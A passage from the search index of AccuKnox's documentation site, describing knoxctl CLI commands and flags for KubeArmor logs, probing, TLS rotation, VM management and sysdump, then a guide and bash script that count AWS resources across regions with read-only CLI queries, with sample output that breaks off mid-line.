operations.</p>"},{"location":"knoxctl/kubearmor/","title":"KubeArmor","text":"<p>KubeArmor uses eBPF and Linux Security Modules (LSM) to provide a policy-based system to restrict any unwanted, malicious behavior of cloud-native workloads at runtime. To know more about KubeArmor, please check out kubearmor.io.</p>"},{"location":"knoxctl/kubearmor/#logs","title":"Logs","text":"<p>The <code>knoxctl logs</code> command is used to observe logs from KubeArmor. It provides a way to monitor and retrieve logs related to various activities and events within your Kubernetes environment.</p>"},{"location":"knoxctl/kubearmor/#logs-usage","title":"Logs Usage","text":"<p>To use the <code>knoxctl logs</code> command, the basic syntax is:</p> <pre><code>knoxctl logs [flag] [option]\n</code></pre>"},{"location":"knoxctl/kubearmor/#logs-flags","title":"Logs Flags","text":"<p>Below is a table of flags available with the <code>knoxctl logs</code> command, along with their descriptions:</p> Flag Description <code>--container</code> Name of the container. <code>--gRPC</code> gRPC server information. <code>--json</code> Flag to print alerts and logs in the JSON format. <code>-l</code>, <code>--labels</code> Use the labels to select the endpoints. <code>--limit</code> Number of logs you want to see. <code>--logFilter</code> Filter for what kinds of alerts and logs to receive, options: <code>{policy &amp;#124; system &amp;#124; all}</code> (default <code>\"policy\"</code>). <code>--logPath</code> Output location for alerts and logs, options: <code>{path &amp;#124; stdout &amp;#124; none}</code> (default <code>\"stdout\"</code>). <code>--logType</code> Log type you want (e.g., <code>ContainerLog</code>, <code>HostLog</code>). <code>--msgPath</code> Output location for messages, options: <code>{path &amp;#124; stdout &amp;#124; none}</code> (default <code>\"none\"</code>). <code>-n</code>, <code>--namespace</code> Kubernetes namespace filter. <code>--operation</code> Type of operation (e.g., <code>Process</code>, <code>File</code>, <code>Network</code>). <code>--pod</code> Name of the pod. <code>--resource</code> Command used by the user. <code>--source</code> Binary used by the system. <code>-h</code>, <code>--help</code> Help for logs. <p>Use these flags to tailor the <code>knoxctl logs</code> output to your specific requirements, whether it's for debugging, monitoring, or auditing purposes within your Kubernetes cluster.</p>"},{"location":"knoxctl/kubearmor/#probe","title":"Probe","text":"<p>The <code>knoxctl probe</code> command is designed to check for supported KubeArmor features in the current Kubernetes environment. This command is essential for understanding the compatibility and feature support of KubeArmor in different deployment scenarios.</p>"},{"location":"knoxctl/kubearmor/#probe-usage","title":"Probe Usage","text":"<p>To use the <code>knoxctl probe</code> command, the basic syntax is:</p> <pre><code>knoxctl probe [flags]\n</code></pre> <p>The <code>probe</code> command operates differently based on whether KubeArmor is currently running:</p> <ul> <li> <p>If KubeArmor is Not Running: The command performs a pre-check to determine if KubeArmor will be supported in the environment and identifies which features (e.g., observability, enforcement) will be available.</p> </li> <li> <p>If KubeArmor is Running: It probes the environment where KubeArmor is running (e.g., systemd mode, Kubernetes, etc.), the supported KubeArmor features, the pods being handled by KubeArmor, and the policies running on each of these pods.</p> </li> </ul>"},{"location":"knoxctl/kubearmor/#probe-flags","title":"Probe Flags","text":"<p>Below is a table of flags available with the <code>knoxctl probe</code> command, along with their descriptions:</p> Flag Description <code>--full</code> If KubeArmor is not running, this flag deploys a daemonset to gather more detailed information about KubeArmor support in the environment. The daemonset is deleted after probing. <code>-h</code>, <code>--help</code> Provides help information for the probe command. <code>-n</code>, <code>--namespace</code> Specifies the namespace for resources (default \"kube-system\"). <p>This command is particularly useful for administrators and operators to ensure that their environment is compatible with KubeArmor and to understand the extent of its feature support. Use the <code>--full</code> flag for a more comprehensive probe, especially when KubeArmor is not running.</p>"},{"location":"knoxctl/kubearmor/#profile","title":"Profile","text":"<p>The <code>knoxctl profile</code> command is used for profiling logs within your Kubernetes environment. This command starts a Terminal User Interface (TUI) that allows for an interactive and real-time analysis of log data.</p>"},{"location":"knoxctl/kubearmor/#profile-usage","title":"Profile Usage","text":"<p>To use the <code>knoxctl profile</code> command, the basic syntax is:</p> <pre><code>knoxctl profile [flags]\n</code></pre> <p>When executed, <code>knoxctl profile</code> launches a TUI, enabling users to interactively navigate and inspect the logs.</p>"},{"location":"knoxctl/kubearmor/#profile-flags","title":"Profile Flags","text":"<p>Below is a table of flags available with the <code>knoxctl profile</code> command, along with their descriptions:</p> Flag Description <code>--gRPC</code> Specify the gRPC server information for the profile command. <code>-h</code>, <code>--help</code> Provides help information for the profile command. <code>--namespace</code> Filter logs based on a specific Kubernetes namespace. <code>--pod</code> Filter logs based on a specific Pod name. <p>The <code>knoxctl profile</code> command is particularly useful for administrators and developers who need to analyze and understand the behavior of their applications and the Kubernetes environment. By using the TUI, users can dynamically interact with log data, making the process of log analysis more efficient and insightful.</p>"},{"location":"knoxctl/kubearmor/#rotate-tls","title":"Rotate TLS","text":"<p>The <code>knoxctl rotate-tls</code> command is used to rotate TLS certificates for the webhook controller. This operation is crucial for maintaining the security and integrity of TLS communication within your Kubernetes environment.</p>"},{"location":"knoxctl/kubearmor/#rotate-tls-usage","title":"Rotate TLS Usage","text":"<p>To use the <code>knoxctl rotate-tls</code> command, the basic syntax is:</p> <pre><code>knoxctl rotate-tls [flags]\n</code></pre> <p>This command facilitates the rotation of TLS certificates, ensuring that your webhook controllers are using up-to-date and secure certificates.</p>"},{"location":"knoxctl/kubearmor/#rotate-tls-flags","title":"Rotate TLS Flags","text":"<p>The following table lists the available flags for the <code>knoxctl rotate-tls</code> command, along with their descriptions:</p> Flag Description <code>-h</code>, <code>--help</code> Displays help information for the rotate-tls command. <code>-n</code>, <code>--namespace</code> Specifies the namespace for the resources. The default is \"kube-system\". <p>Rotating TLS certificates is a best practice for securing webhook communications. By regularly updating certificates, you can prevent potential security breaches and ensure the confidentiality and integrity of the data transmitted between services.</p> <p>Note</p> <p>In case you run into any issues, please feel free to email support@accuknox.com. For more details, please check out accuknox.com and help.accuknox.com.</p>"},{"location":"knoxctl/miscellaneous/","title":"Miscellaneous","text":""},{"location":"knoxctl/miscellaneous/#vm-commands-for-kvmservice","title":"VM Commands for kvmservice","text":"<p>The <code>knoxctl vm</code> command suite offers a range of functionalities to manage Virtual Machines (VMs) within the kvmservice environment. These commands allow for the onboarding, offboarding, and management of VMs in the kvms control plane.</p>"},{"location":"knoxctl/miscellaneous/#usage","title":"Usage","text":"<p>To use VM-related commands, the basic syntax is:</p> <pre><code>knoxctl vm [command]\n</code></pre>"},{"location":"knoxctl/miscellaneous/#available-commands","title":"Available Commands","text":"<p>Below are the available commands under <code>knoxctl vm</code> along with their descriptions:</p> <ul> <li>add: Onboard a new VM onto the kvms control plane.</li> <li>delete: Offboard an existing VM from the kvms control plane.</li> <li>getscript: Download the VM installation script for the kvms control plane.</li> <li>label: Handle labels for VMs in the kvms control plane.</li> <li>list: List all configured VMs within the control plane.</li> <li>policy: Manage policies for bare-metal VMs/kvms control plane VMs.</li> </ul>"},{"location":"knoxctl/miscellaneous/#flags","title":"Flags","text":"<p>The following flags are available for <code>knoxctl vm</code> commands:</p> Flag Description <code>-h</code>, <code>--help</code> Displays help information for the VM command. <code>--http-ip</code> Specifies the IP address of the kvm-service (default \"127.0.0.1\"). <code>--http-port</code> Specifies the port of the kvm-service (default \"8000\"). <code>--kvms</code> Enable this flag if operating in a kvms environment/control-plane. <p>These commands provide comprehensive control over VMs in a kvmservice environment, simplifying tasks related to VM lifecycle and policy management.</p>"},{"location":"knoxctl/miscellaneous/#system-dump","title":"System Dump","text":"<p>The <code>knoxctl sysdump</code> command is designed to collect comprehensive system dump information for troubleshooting and error reporting. It specifically gathers data from <code>accuknox-agents</code> and <code>KubeArmor</code>, encapsulating essential diagnostic information including logs from the pods present in these namespaces.</p>"},{"location":"knoxctl/miscellaneous/#sysdump-usage","title":"Sysdump Usage","text":"<p>To use the <code>knoxctl sysdump</code> command, the basic syntax is:</p> <pre><code>knoxctl sysdump [flags]\n</code></pre> <p>This command is instrumental in generating detailed system reports, which are crucial for analyzing and resolving issues within your deployment.</p>"},{"location":"knoxctl/miscellaneous/#sysdump-flags","title":"Sysdump Flags","text":"<p>The following flags are available for <code>knoxctl sysdump</code>:</p> Flag Description <code>-f</code>, <code>--discovery-engine-sysdump</code> Specifies the output file for the accuknox-agents dump. This flag allows you to define where the system dump for the accuknox-agents should be saved. <code>-h</code>, <code>--help</code> Displays help information for the sysdump command. <code>-k</code>, <code>--kubearmor-sysdump</code> Specifies the output file for the KubeArmor dump. This enables you to set the destination file for the system dump data collected from KubeArmor. <p>The <code>sysdump</code> command effectively gathers logs and other critical information from the specified namespaces, providing a valuable resource for diagnosing system issues and enhancing the effectiveness of troubleshooting processes.</p> <p>By utilizing these flags, users can direct the output of the system dumps to specific files, thereby organizing and simplifying the process of data analysis and report generation.</p>"},{"location":"knoxctl/miscellaneous/#global-flags","title":"Global Flags","text":""},{"location":"knoxctl/miscellaneous/#-context-string","title":"<code>--context string</code>","text":"<ul> <li>Description: Specifies the name of the kubeconfig context to use.</li> <li>Use Case: Particularly useful when managing multiple Kubernetes clusters. It allows you to switch between different contexts, directing <code>knoxctl</code> to operate within a specific Kubernetes environment.</li> <li>Example Usage: <code>knoxctl &lt;command&gt; --context=my-context-name</code></li> </ul>"},{"location":"knoxctl/miscellaneous/#-kubeconfig-string","title":"<code>--kubeconfig string</code>","text":"<ul> <li>Description: Sets the path to the kubeconfig file for <code>knoxctl</code>.</li> <li>Use Case: The kubeconfig file contains vital configuration details about Kubernetes clusters, users, namespaces, and authentication methods. By default, <code>knoxctl</code> uses the kubeconfig file located at <code>$HOME/.kube/config</code>. However, this flag allows you to use a different kubeconfig file as necessary.</li> <li>Example Usage: <code>knoxctl &lt;command&gt; --kubeconfig=/path/to/kubeconfig</code></li> </ul> <p>Note</p> <p>In case you run into any issues, please feel free to email support@accuknox.com. For more details, please check out accuknox.com and help.accuknox.com.</p>"},{"location":"resources/","title":"Resources","text":"<p>CWPP Troubleshooting</p> <p>CSPM Troubleshooting</p> <p>User Manual</p> <p>Marketplace</p> <p>Customer Data Backup Guide</p> <p>Upgrading AccuKnox Agents</p> <p>Calculate Pricing</p> <p>On-prem Installation</p> <p>Ticketing Procedures</p> <p>Technical Guide</p> <p>Release Notes</p> <p>Glossary</p>"},{"location":"resources/accuknox-manual/","title":"AccuKnox User Manual","text":"<p>DOWNLOAD USER MANUAL</p>"},{"location":"resources/count-assets/","title":"AWS Assets Count","text":"AWS Azure GCP"},{"location":"resources/count-assets/#prerequisites","title":"Prerequisites","text":"<p>Need an IAM Access key and Secret key with the entire account ReadOnly Access.</p>"},{"location":"resources/count-assets/#assets-count","title":"Assets count","text":"<p>1.All EC2 instances:</p> <pre><code>aws ec2 describe-instances --region \"$region\" --output text --query 'length(Reservations[].Instances[])'\n</code></pre> <p>2.EBS Volume Count:</p> <pre><code>aws ec2 describe-volumes --region \"$region\" --query 'length(Volumes[])'\n</code></pre> <p>3.s3 buckets:</p> <pre><code>aws s3api list-buckets --query 'length(Buckets[])'\n</code></pre> <p>4.RDS:</p> <pre><code>aws rds describe-db-instances --region \"$region\" --query 'length(DBInstances[])'\n</code></pre> <p>5.VPCs:</p> <pre><code>aws ec2 describe-vpcs --region \"$region\" --query 'length(Vpcs[])'\n</code></pre> <p>6.Load Balancers:</p> <pre><code>aws elbv2 describe-load-balancers --region \"$region\" --query 'length(LoadBalancers[])'\n</code></pre> <p>7.Lambda functions:</p> <pre><code>aws lambda list-functions --region \"$region\" --query 'length(Functions[])'\n</code></pre> <p>8.EKS clusters:</p> <pre><code>aws eks list-clusters --region \"$region\" --query 'length(clusters[])'\n</code></pre> <p>9.IAM roles:</p> <pre><code>aws iam list-roles --query 'length(Roles[])'\n</code></pre> <p>10.ECS Clusters:</p> <pre><code>aws ecs list-clusters --region \"$region\" --query 'length(clusterArns[])'\n</code></pre> <p>11.AWS Subnets:</p> <pre><code>aws ec2 describe-subnets --region \"$region\" --query 'length(Subnets[])'\n</code></pre> <p>12.Security groups:</p> <pre><code>aws ec2 describe-security-groups --region \"$region\" --query 'length(SecurityGroups[])'\n</code></pre> <p>13.KMS Key:</p> <pre><code>aws kms list-keys --region \"$region\"--query 'length(Keys)'\n</code></pre> <p>14.RDS Clusters:</p> <pre><code>aws rds describe-db-clusters --region \"$region\" --query 'length(DBClusters)'\n</code></pre> <p>15.Network ACL:</p> <pre><code>aws ec2 describe-network-acls --region \"$region\" --query 'length(NetworkAcls)'\n</code></pre> <p>16.IAM Users:</p> <pre><code>aws iam list-users --query 'length(Users[])'\n</code></pre> <p>17.IAM Groups:</p> <pre><code>aws iam list-groups --query 'length(Groups[])'\n</code></pre> <p>18.VPC Peering Connections:</p> <pre><code>aws ec2 describe-vpc-peering-connections --region \"$region\" --query 'length(VpcPeeringConnections[])'\n</code></pre> <p>19.EIP:</p> <pre><code>aws ec2 describe-addresses --region \"$region\" --query 'length(Addresses[])'\n</code></pre> <p>20.VPC Route table:</p> <pre><code>aws ec2 describe-route-tables --region \"$region\" --query 'length(RouteTables[])'\n</code></pre> <p>21.Elastic Cache Clusters:</p> <pre><code>aws elasticache describe-cache-clusters --region \"$region\" --query 'length(CacheClusters[])'\n</code></pre>"},{"location":"resources/count-assets/#bash-script-to-get-aws-assets-count","title":"Bash script to get AWS Assets count","text":"<pre><code>#!/bin/bash\nregions=$(aws ec2 describe-regions --query 'Regions[].RegionName' --output text)\nsum_count=0\nfor region in $regions; do\ncountec2=0\ncountebs=0\ncountvpc=0\ncountrds=0\ncountlamb=0\ncountnci=0\ncountsub=0\ncountnlb=0\ncountkey=0\ncountecs=0\ncounteks=0\ncountpeer=0\ncountelccl=0\ncountrdsc=0\ncounteip=0\ncountsg=0\ncountrtab=0\ncountnetacl=0\necho -e \"Assets in the Region: $region\\n\\n\"\ncountec2=$(aws ec2 describe-instances --region \"$region\" --output text --query 'length(Reservations[].Instances[])')\necho \"Ec2 instances in Region: $region is $countec2\"\ncountebs=$(aws ec2 describe-volumes --region \"$region\" --query 'length(Volumes[])')\necho \"Elastic Block Storage in Region: $region is $countebs\"\ncountvpc=$(aws ec2 describe-vpcs --region \"$region\" --query 'length(Vpcs[])')\necho \"VPC in Region: $region is $countvpc\"\ncountrds=$(aws rds describe-db-instances --region \"$region\" --query 'length(DBInstances[])')\necho \"RDS in Region: $region is $countrds\"\ncountlamb=$(aws lambda list-functions --region \"$region\" --query 'length(Functions[])')\necho \"Lambda Functions in Region: $region is $countlamb\"\ncountnci=$(aws ec2 describe-network-interfaces --region \"$region\" --query 'length(NetworkInterfaces)')\necho \"Ec2 Network Interfaces in Region: $region is $countnci\"\ncountsub=$(aws ec2 describe-subnets --region \"$region\" --query 'length(Subnets[])')\necho \"Subnets in the Region: $region is $countsub\"\ncountnlb=$(aws elbv2 describe-load-balancers --region \"$region\" --query 'length(LoadBalancers[])')\necho \"Network Load Balancers in Region: $region is $countnlb\"\ncountkey=$(aws kms list-keys --region \"$region\" --query 'length(Keys[])')\necho \"KMS Key in the region: $region is $countkey\"\ncountecs=$(aws ecs list-clusters --region \"$region\" --query 'length(clusterArns[])')\necho \"ECS Clusters across region : $region is $countecs\"\ncounteks=$(aws eks list-clusters --region \"$region\" --query 'length(clusters[])')\necho \"EKS Clusters across region : $region is $counteks\"\ncountpeer=$(aws ec2 describe-vpc-peering-connections --region \"$region\" --query 'length(VpcPeeringConnections[])')\necho \"VPC Peering in the region : $region is $countpeer\"\ncountelcl=$(aws elasticache describe-cache-clusters --region \"$region\" --query 'length(CacheClusters[])')\necho \"Elastic Cache Clusters in the region : $region is $countelcl\"\ncountrdsc=$(aws rds describe-db-clusters --region \"$region\" --query 'length(DBClusters)')\necho \"RDS Clusters in the region : $region is $countrdsc\"\ncounteip=$(aws ec2 describe-addresses --region \"$region\" --query 'length(Addresses[])')\necho \"Elastic IP in the region : $region is $counteip\"\ncountsg=$(aws ec2 describe-security-groups --region \"$region\" --query 'length(SecurityGroups[])')\necho \"Security Groups in the region : $region is $countsg\"\ncountrtab=$(aws ec2 describe-route-tables --region \"$region\" --query 'length(RouteTables[])')\necho \"Route table in the region : $region is $countrtab\"\ncountnetacl=$(aws ec2 describe-network-acls --region \"$region\" --query 'length(NetworkAcls)')\necho -e \"Network ACL in the region : $region is $countnetacl\\n\\n\"\nsum_count=$((sum_count + countec2 + countebs + countvpc + countrds + countlamb + countelb + countnci + countnlb + countsub + countkey + countecs + counteks + countpeer + countelccl + countrdsc + counteip + countsg + countrtab + countnetacl ))\ndone\ncounts3=$(aws s3api list-buckets --query 'length(Buckets[])')\necho -e \"s3 buckets in the account is $counts3\\n\\n\"\ncountiusers=$(aws iam list-users --query 'length(Users[])')\necho -e \"IAM users in the account is $countiusers\\n\\n\"\ncountgroups=$(aws iam list-groups --query 'length(Groups[])')\necho -e \"IAM Groups in the account is $countgroups\\n\\n\"\ncountiroles=$(aws iam list-roles --query 'length(Roles[])')\necho -e \"IAM Roles in the account is $countiroles\\n\\n\"\ntotal_count=$((sum_count + counts3 + countiusers + countgroups + countiroles))\necho \"Total Assets in this AWS account is : $total_count\"\n</code></pre>"},{"location":"resources/count-assets/#sample-output","title":"Sample Output","text":"<pre><code>Assets in the Region: ap-south-1\n\nEc2 instances in Region: ap-south-1 is 1\nElastic Block Storage in Region: ap-south-1 is 1\nVPC in Region: ap-south-1 is 2\nRDS in Region: ap-south-1 is 0\nLambda Functions in Region: ap-south-1 is 0\nEc2 Network Interfaces in Region: ap-south-1 is 1\nSubnets in the Region: ap-south-1 is 5\nNetwork Load Balancers in Region: ap-south-1 is 0\nKMS Key in the region: ap-south-1 is 2\nECS Clusters across region : ap-south-1 is 1\nEKS Clusters across region : ap-south-1 is 0\nVPC Peering in the region : ap-south-1 is 0\nElastic Cache Clusters in the region : ap-south-1 is 0\nRDS Clusters in the region : ap-south-1 is 0\nElastic IP in the region : ap-south-1 is 0\nSecurity Groups in the region : ap-south-1 is 3\nRoute table in the region : ap-south-1 is 3\nNetwork ACL in the region : ap-south-1 is 2\n\n\nAssets in the Region: eu-north-1\n\n\nEc2 instances in Region: eu-north-1 is 0\nElastic Block Storage in Region: eu-north-1 is 0\nVPC in Region: eu-north-1 is 1\nRDS in Region: eu-north-1 is 0\nLambda Functions in Region: eu-north-1 is 0\nEc2 Network Interfaces in Region: eu-north-1 is 0\nSubnets in the Region: eu-north-1 is 3\nNetwork Load Balancers in Region: eu-north-1 is 0\nKMS Key in the region: eu-north-1 is 1\nECS Clusters across region : eu-north-1 is 0\nEKS Clusters across region : eu-north-1 is 0\nVPC Peering in the region : eu-north-1 is 0\nElastic Cache Clusters in the region : eu-north-1 is 0\nRDS Clusters in the region : eu-north-1 is 0\nElastic IP in the region : eu-north-1 is 0\nSecurity Groups in the region : eu-north-1 is 1\nRoute table in the region : eu-north-1 is 1\nNetwork ACL in the region : eu-north-1 is 1\n\n\nAssets in the Region: eu-west-3\n\n\nEc2 instances in Region: eu-west-3 is 0\nElastic Block Storage in Region: eu-west-3 is 0\nVPC in Region: eu-west-3 is 1\nRDS in Region: eu-west-3 is 0\nLambda Functions in Region: eu-west-3 is 0\nEc2 Network Interfaces in Region: eu-west-3 is 0\nSubnets in the Region: eu-west-3 is 3\nNetwork Load Balancers in Region: eu-west-3 is 0\nKMS Key in the region: eu-west-3 is 0\nECS Clusters across region : eu-west-3 is 0\nEKS Clusters across region : eu-west-3 is 0\nVPC Peering in the region : eu-west-3 is 0\nElastic Cache Clusters in the region : eu-west-3 is 0\nRDS Clusters in the region : eu-west-3 is 0\nElastic IP in the region : eu-west-3 is 0\nSecurity Groups in the region : eu-west-3 is 1\nRoute table in the region : eu-west-3 is 1\nNetwork ACL in the region : eu-west-3 is 1\n\n\nAssets in the Region: eu-west-2\n\n\nEc2 instances in Region: eu-west-2 is 16\nElastic Block Storage in Region: eu-west-2 is 48\nVPC in Region: eu-west-2 is 2\nRDS in Region: eu-west-2 is 1\nLambda Functions in Region: eu-west-2 is 0\nEc2 Network Interfaces in Region: eu-west-2 is 64\nSubnets in the Region: eu-west-2 is 15\nNetwork Load Balancers in Region: eu-west-2 is 1\nKMS Key in the region: eu-west-2 is 28\nECS Clusters across region : eu-west-2 is 0\nEKS Clusters across region : eu-west-2 is 1\nVPC Peering in the region : eu-west-2 is 0\nElastic Cache Clusters in the region : eu-west-2 is 1\nRDS Clusters in the region : eu-west-2 is 1\nElastic IP in the region : eu-west-2 is 2\nSecurity Groups in the region : eu-west-2 is 12\nRoute table in the region : eu-west-2 is 4\nNetwork ACL in the region : eu-west-2 is 2\n\n\nAssets in the Region: eu-west-1\n\n\nEc2 instances in Region: eu-west-1 is 0\nElastic Block Storage in Region: eu-west-1 is 2\nVPC in Region: eu-west-1 is 1\nRDS in Region: eu-west-1 is 0\nLambda Functions in Region: eu-west-1 is 0\nEc2 Network Interfaces in Region: eu-west-1 is 2\nSubnets in the Region: eu-west-1 is 3\nNetwork Load Balancers in Region: eu-west-1 is 0\nKMS Key in the region: eu-west-1 is 6\nECS Clusters across region : eu-west-1 is 0\nEKS Clusters across region : eu-west-1 is 0\nVPC Peering in the region : eu-west-1 is 0\nElastic Cache Clusters in the region : eu-west-1 is 0\nRDS Clusters in the region : eu-west-1 is 0\nElastic IP in the region : eu-west-1 is 0\nSecurity Groups in the region : eu-west-1 is 5\nRoute table in the region : eu-west-1 is 1\nNetwork ACL in the region : eu-west-1 is 1\n\n\nAssets in the Region: ap-northeast-3\n\n\nEc2 instances in Region: ap-northeast-3 is 0\nElastic Block Storage in Region: ap-northeast-3 is 0\nVPC in Region: ap-northeast-3 is 1\nRDS in Region: ap-northeast-3 is 0\nLambda Functions in Region: ap-northeast-3 is 0\nEc2 Network Interfaces in Region: ap-northeast-3 is 0\nSubnets in the Region: ap-northeast-3 is 3\nNetwork Load Balancers in Region: ap-northeast-3 is 0\nKMS Key in the region: ap-northeast-3 is 0\nECS Clusters across region : ap-northeast-3 is 0\nEKS Clusters across region : ap-northeast-3 is 0\nVPC Peering in the region : ap-northeast-3 is 0\nElastic Cache Clusters in the region : ap-northeast-3 is 0\nRDS Clusters in the region : ap-northeast-3 is 0\nElastic IP in the region : ap-northeast-3 is 0\nSecurity Groups in the region : ap-northeast-3 is 1\nRoute table in the region : ap-northeast-3 is 1\nNetwork ACL in the region : ap-northeast-3 is 1\n\n\nAssets in the Region: ap-northeast-2\n\n\nEc2 instances in Region: ap-northeast-2 is 0\nElastic Block Storage in Region: ap-northeast-2 is 0\nVPC in Region: ap-northeast-2 is 1\nRDS in Region: ap-northeast-2 is 0\nLambda Functions in Region: ap-northeast-2 is 0\nEc2 Network Interfaces in Region: ap-northeast-2 is 0\nSubnets in the Region: ap-northeast-2 is 4\nNetwork Load Balancers in Region: ap-northeast-2 is 0\nKMS Key in the region: ap-northeast-2 is 0\nECS Clusters across region : ap-northeast-2 is 0\nEKS Clusters across region : ap-northeast-2 is 0\nVPC Peering in the region : ap-northeast-2 is 0\nElastic Cache Clusters in the region : ap-northeast-2 is 0\nRDS Clusters in the region : ap-northeast-2 is 0\nElastic IP in the region : ap-northeast-2 is 0\nSecurity Groups in the region : ap-northeast-2 is 1\nRoute table in the region : ap-northeast-2 is 1\nNetwork ACL in the region : ap-northeast-2 is 1\n\n\nAssets in the Region: ap-northeast-1\n\n\nEc2 instances in Region: ap-northeast-1 is 0\nElastic Block Storage in Region: ap-northeast-1 is 0\nVPC in Region: ap-northeast-1 is 1\nRDS in Region: ap-northeast-1 is 0\nLambda Functions in Region: ap-northeast-1 is 0\nEc2 Network Interfaces in Region: ap-northeast-1 is 0\nSubnets in the Region: ap-northeast-1 is 3\nNetwork Load Balancers in Region: ap-northeast-1 is 0\nKMS Key in the region: ap-northeast-1 is 0\nECS Clusters across region : ap-northeast-1 is 0\nEKS Clusters across region : ap-northeast-1 is 0\nVPC Peering in the region : ap-northeast-1 is 0\nElastic Cache Clusters in the region : ap-northeast-1 is 0\nRDS Clusters in the region : ap-northeast-1 is 0\nElastic IP in the region : ap-northeast-1 is 0\nSecurity Groups in the region : ap-northeast-1 is 1\nRoute table in the region : ap-northeast-1 is 1\nNetwork ACL in the region : ap-northeast-1 is 1\n\n\nAssets in the Region: ca-central-1\n\n\nEc2 instances in Region: ca-central-1 is 0\nElastic Block Storage in Region: ca-central-1 is 0\nVPC in Region: ca-central-1 is 1\nRDS in Region: ca-central-1 is 0\nLambda Functions in Region: ca-central-1 is 0\nEc2 Network Interfaces in Region: ca-central-1 is 0\nSubnets in the Region: ca-central-1 is 3\nNetwork Load Balancers in Region: ca-central-1 is 0\nKMS Key in the region: ca-central-1 is 5\nECS Clusters across region : ca-central-1 is 0\nEKS Clusters across region : ca-central-1 is 0\nVPC Peering in the region : ca-central-1 is 0\nElastic Cache Clusters in the region : ca-central-1 is 0\nRDS Clusters in the region : ca-central-1 is 0\nElastic IP in the region : ca-central-1 is 0\nSecurity Groups in the region : ca-central-1 is 1\nRoute table in the region : ca-central-1 is 1\nNetwork ACL in the region : ca-central-1 is 1\n\n\nAssets in the Region: sa-east-1\n\n\nEc2 instances in Region: sa-east-1 is 0\nElastic Block Storage in Region: sa-east-1 is 0\nVPC in Region: sa-east-1 is 1\nRDS in Region: sa-east-1 is 0\nLambda Functions in Region: sa-east-1 is 0\nEc2 Network Interfaces in Region: sa-east-1 is 0\nSubnets in the Region: sa-east-1 is 3\nNetwork Load Balancers in Region: sa-east-1 is 0\nKMS Key in the region: sa-east-1 is 0\nECS Clusters across region : sa-east-1 is 0\nEKS Clusters across region : sa-east-1 is 0\nVPC Peering in the region : sa-east-1 is 0\nElastic Cache Clusters in the region : sa-east-1 is 0\nRDS Clusters in the region : sa-east-1 is 0\nElastic IP in the region : sa-east-1 is 0\nSecurity Groups in the region : sa-east-1 is 1\nRoute table in the region : sa-east-1 is 1\nNetwork ACL in the region : sa-east-1 is 1\n\n\nAssets in the Region: ap-southeast-1\n\n\nEc2 instances in Region: ap-southeast-1 is 0\nElastic Block Storage in Region: ap-southeast-1 is 0\nVPC in Region: ap-southeast-1 is 1\nRDS in Region: ap-southeast-1 is 0\nLambda Functions in Region: ap-southeast-1 is 0\nEc2 Network Interfaces in Region: ap-southeast-1 is 0\nSubnets in the Region: ap-southeast-1 is 3\nNetwork Load Balancers in Region: ap-southeast-1 is 0\nKMS Key in the region: ap-southeast-1 is 0\nECS Clusters across region : ap-southeast-1 is 0\nEKS Clusters across region : ap-southeast-1 is 0\nVPC Peering in the region : ap-southeast-1 is 0\nElastic Cache Clusters in the region : ap-southeast-1 is 0\nRDS Clusters in the region : ap-southeast-1 is 0\nElastic IP in the region : ap-southeast-1 is 0\nSecurity Groups in the region : ap-southeast-1 is 1\nRoute table in the region : ap-southeast-1 is 1\nNetwork ACL in the region : ap-southeast-1 is 1\n\n\nAssets in the Region: ap-southeast-2\n\n\nEc2 instances in Region: ap-southeast-2 is 0\nElastic Block Storage in Region: ap-southeast-2 is 0\nVPC in Region: ap-southeast-2 is 1\nRDS in Region: ap-southeast-2 is 0\nLambda Functions in Region: ap-southeast-2 is 0\nEc2 Network Interfaces in Region: ap-southeast-2 is 0\nSubnets in the Region: ap-southeast-2 is 3\nNetwork Load Balancers in Region: ap-southeast-2 is 0\nKMS Key in the region: ap-southeast-2 is 0\nECS Clusters across region : ap-southeast-2 is 0\nEKS Clusters across region : ap-southeast-2 is 0\nVPC Peering in the region : ap-southeast-2 is 0\nElastic Cache Clusters in the region : ap-southeast-2 is 0\nRDS Clusters in the region : ap-southeast-2 is 0\nElastic IP in the region : ap-southeast-2 is 0\nSecurity Groups in the region : ap-southeast-2 is 1\nRoute table in the region : ap-southeast-2 is 1\nNetwork ACL in the region : ap-southeast-2 is 1\n\n\nAssets in the Region: eu-central-1\n\n\nEc2 instances in Region: eu-central-1 is 0\nElastic Block Storage in Region: eu-central-1 is 0\nVPC in Region: eu-central-1 is 1\nRDS in Region: eu-central-1 is 0\nLambda Functions in Region: eu-central-1 is 0\nEc2 Network Interfaces in Region: eu-central-1 is 0\nSubnets in the Region: eu-central-1 is 3\nNetwork Load Balancers in Region: eu-central-1 is 0\nKMS Key in the region: eu-central-1 is 2\nECS Clusters across region : eu-central-1 is 0\nEKS Clusters across region : eu-central-1 is 0\nVPC Peering in the region : eu-central-1 is 0\nElastic Cache Clusters in the region : eu-central-1 is 0\nRDS Clusters in the region : eu-central-1 is 0\nElastic IP in the region : eu-central-1 is 0\nSecurity Groups in the region : eu-central-1 is 1\nRoute table in the region : eu-central-1 is 1\nNetwork ACL in the region : eu-central-1 is 1\n\n\nAssets in the Region: us-east-1\n\n\nEc2 instances in Region: us-east-1 is 0\nElastic Block Storage in Region: us-east-1 is 0\nVPC in Region: us-east-1 is 1\nRDS in Region: us-east-1 is 0\nLambda Functions in Region: us-east-1 is 0\nEc2 Network Interfaces in Region: us-east-1 is 0\nSubnets in the Region: us-east-1 is 6\nNetwork Load Balancers in Region: us-east-1 is 0\nKMS Key in the region: us-east-1 is 3\nECS Clusters across region : us-east-1 is 0\nEKS Clusters across region : us-east-1 is 0\nVPC Peering in the region : us-east-1 is 0\nElastic Cache Clusters in the region : us-east-1 is 0\nRDS Clusters in the region : us-east-1 is 0\nElastic IP in the region : us-east-1 is 0\nSecurity Groups in the region : us-east-1 is 4\nRoute table in the region : us-east-1 is 1\nNetwork ACL in the region : us-east-1 is 1\nAssets in the Region: us-east-2\nEc2 instances in Region: us-east-2 is 27\nElastic Block Storage in Region: us-east-2 is 77\nVPC in Region: us-east-2 is 3\nRDS in Region: us-east-2 is 1\nLambda Functions in Region: us-east-2 is 0\nEc2 Network Interfaces in Region: us-east-2 is 111\nSubnets in the Region: us-east-2 is 21\nNetwork Load Balancers in Region: us-east-2 is 2\nKMS Key in the region: us-east-2 is 18\nECS Clusters across region : us-east-2 is 0\nEKS Clusters across region : us-east-2 is 2\nVPC Peering in the region : us-east-2 is 0\nElastic Cache Clusters in the region : us-east-2 is 1\nRDS Clusters in the region : us-east-2 is 1\nElastic IP in the region : us-east-2 is 4\nSecurity Groups in the region : us-east-2 